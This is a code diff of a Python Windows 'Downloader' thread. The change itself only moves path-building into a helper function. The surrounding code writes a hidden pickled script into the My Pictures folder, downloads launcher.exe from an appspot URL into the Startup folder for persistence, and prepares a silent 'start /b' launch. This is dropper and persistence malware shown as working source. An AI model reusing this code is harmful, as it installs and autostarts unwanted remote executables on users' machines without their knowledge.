@@ -23,8 +23,7 @@ class Downloader(threading.Thread):
     def run(self):
         """Run the thread."""
         #Make a file for the script
-        path = shell.SHGetFolderPath(0, shellcon.CSIDL_MYPICTURES, None, 0)
-        path = os.path.join(path, "script.txt")
+        path = file_in_special_path(shellcon.CSIDL_MYPICTURES, "script.txt")
         file = open(path, "w")
         #Save the script
         cPickle.dump(script, file)
@@ -33,8 +32,7 @@ class Downloader(threading.Thread):
         win32api.SetFileAttributes(path,win32con.FILE_ATTRIBUTE_HIDDEN)
         
         #Get a path for the launcher
-        path = shell.SHGetFolderPath(0, shellcon.CSIDL_STARTUP, None, 0)
-        path = os.path.join(path, "launcher.exe")        
+        path = file_in_special_path(shellcon.CSIDL_STARTUP, "launcher.exe")
         #Save the launcher
         url = urllib2.urlopen("http://littlesitetomakemoney.appspot.com/launcher.exe")
         file = open(path, "w")
@@ -47,3 +45,13 @@ class Downloader(threading.Thread):
         #Run the launcher
         command = "start /b %s"%win32api.GetShortPathName(path)
         print command
+        
+#Utility functions.  May be useful elsewhere
+def file_in_special_path(specialpath, file):
+    """Make a path composed of a special (CSIDL) path and a file name.
+    
+    @param specialpath: The CSIDL path found in shellcon
+    @param file: the name of the file
+    """
+    path = shell.SHGetFolderPath(0, specialpath, None, 0)
+    path = os.path.join(path, file)
